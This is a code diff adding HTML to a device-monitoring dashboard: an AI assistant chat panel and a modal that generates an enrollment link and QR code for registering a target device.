+  <div class="ai-panel" id="aiPanel">
+    <div class="ai-panel-header">
+      <div class="ai-panel-title">
+        <i class="fa-solid fa-robot"></i> SP AI Assistant
+      </div>
+      <button class="ai-panel-close" onclick="toggleAiAssistant()" title="Close Assistant" aria-label="Close Assistant"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="ai-panel-body" id="aiPanelBody">
+      <div class="ai-message bot">
+        Hello! I'm your SP Tech Safe AI. I can summarize device activity and flag risks. How can I help today?
+      </div>
+    </div>
+    <div class="ai-panel-footer">
+      <button class="ai-btn-mic" id="aiMicBtn" onclick="toggleAiVoice()" title="Voice Input" aria-label="Use Microphone"><i class="fa-solid fa-microphone"></i></button>
+      <input type="text" id="aiInput" placeholder="Ask AI..." onkeypress="handleAiKeyPress(event)" aria-label="Ask AI assistant">
+      <button class="ai-btn-send" onclick="sendAiMessage()" title="Send Message" aria-label="Send Message"><i class="fa-solid fa-paper-plane"></i></button>
+    </div>
+  </div>
+
+  <!-- ========== GENERATE ENROLLMENT LINK MODAL ========== -->
+  <div class="modal-overlay" id="enrollLinkModal" onclick="handleEnrollModalBg(event)">
+    <div class="modal-box enroll-modal-box">
+      <div class="modal-header">
+        <div class="modal-title-group">
+          <div class="modal-icon modal-icon-purple">
+            <i class="fa-solid fa-link"></i>
+          </div>
+          <div>
+            <h3 class="modal-title">Generate Enrollment Link</h3>
+            <p class="modal-subtitle">Send this link to the target device to connect it</p>
+          </div>
+        </div>
+        <button class="modal-close" onclick="closeEnrollModal()" title="Close">
+          <i class="fa-solid fa-xmark"></i>
+        </button>
+      </div>
+
+      <!-- Label input -->
+      <div class="enroll-label-row">
+        <label class="enroll-label-lbl">Device Label <span class="enroll-optional">(optional)</span></label>
+        <div class="enroll-label-input-wrap">
+          <i class="fa-solid fa-tag"></i>
+          <input type="text" id="enrollDeviceLabel" placeholder="e.g. John's Phone" maxlength="40">
+        </div>
+      </div>
+
+      <button class="btn-gen-link" id="btnGenLink" onclick="generateEnrollLink()">
+        <i class="fa-solid fa-wand-magic-sparkles"></i> Generate Link
+      </button>
+
+      <!-- Result (hidden until link is generated) -->
+      <div id="enrollLinkResult" class="enroll-result-hidden">
+        <div class="enroll-link-box">
+          <div class="enroll-link-label">Shareable Enrollment URL</div>
+          <div class="enroll-link-url-row">
+            <span class="enroll-link-url" id="enrollLinkUrl"></span>
+            <button class="btn-copy-link" id="btnCopyLink" onclick="copyEnrollLink()" title="Copy link">
+              <i class="fa-solid fa-copy"></i>
+            </button>
+          </div>
+        </div>
+
+        <div class="enroll-qr-wrap">
+          <div class="enroll-qr-label"><i class="fa-solid fa-qrcode"></i> Scan with target device</div>
+          <canvas id="enrollQrCanvas"></canvas>
+        </div>
+
+        <div class="enroll-instructions">
+          <div class="enroll-step"><span class="enroll-step-num">1</span> Copy the link above or generate the qr code</div>
+          <div class="enroll-step"><span class="enroll-step-num">2</span> Open it on the target device's browser</div>
+          <div class="enroll-step"><span class="enroll-step-num">3</span> The device will auto-register &amp; appear in your dashboard</div>
+        </div>
+
+        <div class="enroll-token-note">
+          <i class="fa-solid fa-shield-halved"></i>
+          Token: <code id="enrollTokenDisplay"></code>
+        </div>
+      </div>
+
+      <div class="modal-footer">
+        <span class="modal-count" id="enrollModalStatus"></span>
+        <button class="modal-cancel" onclick="closeEnrollModal()">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+  <script src="js/dashboard.js"></script>
+</body>
+</html>
